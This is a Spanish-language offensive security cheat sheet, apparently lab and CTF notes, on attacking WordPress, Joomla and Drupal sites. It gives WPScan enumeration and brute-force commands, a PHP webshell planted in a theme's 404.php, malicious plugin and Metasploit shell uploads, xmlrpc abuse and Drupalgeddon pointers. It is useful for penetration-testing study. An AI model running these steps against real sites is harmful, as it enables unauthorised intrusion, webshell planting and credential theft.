# WordPress y otros CMS

> **Puerto:** normalmente `80/443` (HTTP/S)

Los **CMS** (gestores de contenido) como **WordPress**, **Joomla** y **Drupal** están por todas partes y son un foothold habitual en labs y entornos reales. Su superficie de ataque suele estar en **plugins/temas vulnerables**, **credenciales débiles** del panel y configuraciones expuestas.

---

## Identificar el CMS

```bash
whatweb http://<IP>
curl -s http://<IP> | grep -iE "wp-content|wp-includes|joomla|drupal|generator"
```

Pistas: `/wp-content/` y `/wp-login.php` → WordPress; `/administrator/` → Joomla; `CHANGELOG.txt` y `/user/login` → Drupal.

---

## WordPress — enumeración con WPScan

```bash
# Enumerar todo (plugins, temas, usuarios) — usa un API token para ver CVEs
wpscan --url http://<IP> --enumerate ap,at,u --api-token <TOKEN>

# Solo usuarios
wpscan --url http://<IP> --enumerate u

# Plugins "agresivo" (encuentra más)
wpscan --url http://<IP> --enumerate ap --plugins-detection aggressive
```

Enumeración manual útil:

```text
/wp-login.php            # panel de acceso
/wp-json/wp/v2/users     # lista de usuarios vía API REST
/?author=1               # revela el login del usuario 1 (redirección)
/wp-content/plugins/     # a veces listable
/xmlrpc.php              # fuerza bruta amplificada y SSRF
```

> **Consejo:** `/wp-json/wp/v2/users` suele filtrar los nombres de usuario sin autenticación. Con esos usuarios, haz fuerza bruta de la contraseña del panel.

---

## WordPress — acceso y RCE

### Fuerza bruta del login

```bash
wpscan --url http://<IP> --usernames users.txt --passwords /usr/share/wordlists/rockyou.txt
```

### De admin a RCE (lo habitual)

Con acceso al **panel de administración**, consigues ejecución de comandos editando código PHP:

1. **Editor de temas:** `Apariencia → Editor` → edita `404.php` de un tema inactivo con una webshell:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
   Accede a `http://<IP>/wp-content/themes/<tema>/404.php?cmd=id`.
2. **Subir un plugin malicioso** (`.zip` con PHP).
3. **Metasploit:** `exploit/unix/webapp/wp_admin_shell_upload`.

### xmlrpc.php

```bash
# Fuerza bruta amplificada (muchos intentos en una petición)
curl -s http://<IP>/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'
```

Si `pingback.ping` está activo → SSRF y escaneo interno.

---

## Joomla

```bash
joomscan -u http://<IP>
droopescan scan joomla -u http://<IP>
```

- Panel en `/administrator/`. Versión en `/administrator/manifests/files/joomla.xml`.
- Con admin → editar plantilla (`Templates`) para meter PHP → RCE.

---

## Drupal

```bash
droopescan scan drupal -u http://<IP>
```

- Versiones 7/8 vulnerables a **Drupalgeddon2 (CVE-2018-7600)** y **Drupalgeddon3**: RCE sin autenticación. Busca el exploit con `searchsploit drupal`.

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `wpscan` | Escáner de WordPress (plugins, temas, usuarios, CVEs). |
| `joomscan` / `droopescan` | Escáneres de Joomla / Drupal. |
| `whatweb` | Identificar el CMS y su versión. |
| `searchsploit` | Exploits por CMS y versión. |
| `metasploit` | Módulos de subida de shell (wp_admin_shell_upload, drupal_*). |

---

> **Consejo:** el patrón en CMS es casi siempre el mismo: **identificar el CMS y su versión → buscar plugin/tema/core vulnerable (`searchsploit`, wpscan) o credenciales del panel → de admin a RCE editando código PHP**. Enumera usuarios por la API/`?author=` y reutiliza cualquier contraseña que encuentres. `/wp-config.php` (si lo lees por LFI) contiene las credenciales de la base de datos.
